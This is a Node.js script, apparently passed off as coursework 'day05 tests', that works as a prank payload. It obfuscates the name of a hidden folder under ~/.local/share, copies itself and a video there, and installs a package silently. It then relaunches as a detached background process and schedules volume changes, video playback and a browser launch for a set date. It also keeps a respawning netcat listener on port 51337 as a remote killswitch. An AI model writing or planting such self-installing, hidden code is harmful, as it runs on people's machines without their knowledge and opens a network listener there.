// sup chat
// thank you for enjoying day05 tests

// self install
const cp = require('child_process');
const fs = require('fs');
const path = require('path');

const secretComponent = ('b' + 'a' + + 'a' + 'a').toLowerCase();
const dirpath = path.join(process.env.HOME, '.local', 'share', secretComponent);
const scriptpath = path.join(dirpath, 'index.js');

if (__filename !== scriptpath) {
  cp.execSync(`mkdir -p ${dirpath} > /dev/null 2> /dev/null`);

  const copyFile = filename => {
    const filepath = path.join(dirpath, filename);
    fs.createReadStream(filename).pipe(fs.createWriteStream(filepath));
  };

  copyFile('index.js');
  copyFile('mgs.mp4');

  cp.execSync(`npm install --prefix ${dirpath} timexe > /dev/null 2> /dev/null`);
}

if (__filename !== scriptpath || process.env.FORK === 'true') {
  const newEnv = Object.assign({}, process.env, {FORK: 'false'});
  const my_darling = cp.spawn(process.argv[0], [scriptpath], {
    detached: true,
    stdio: 'ignore',
    env: newEnv
  });

  my_darling.unref();

  return;
}

// payload
const timexe = require('timexe');

const sound1 = timexe('* * * 19 9 49', () => { cp.execSync('osascript -e "set Volume 2"'); });
const mgs = timexe('* * * 19 9 50', () => { cp.execSync('afplay mgs.mp4'); });
const sound2 = timexe('* * * 19 9 59', () => { cp.execSync('osascript -e "set Volume 2"'); });
const youtube = timexe('* * * 19 10 0', () => { cp.execSync('open "https://www.youtube.com/watch?v=NdqbI0_0GsM"'); });

const cleanup = () => {
  timexe.remove(mgs);
  timexe.remove(youtube);
  fs.unlinkSync(scriptpath);
  cp.exec(`pkill -f .local/share/${secretComponent}/index.js`, {
    detached: true,
    stdio: 'ignore'
  });
  cp.exec('pkill -f "nc -l 51337"', {
    detached: true,
    stdio: 'ignore'
  });
  process.exit();
};

const spawnKillswitch = () => {
  const killswitch = cp.exec('nc -l 51337');
  killswitch.stdout.on('data', packet => {
    const data = packet.trim();
    if (data === 'goodbye <3') {
      cleanup();
    }
  });
  killswitch.on('close', () => {
    spawnKillswitch();
  });
  killswitch.on('error', () => {
    spawnKillswitch();
  });
};
spawnKillswitch();
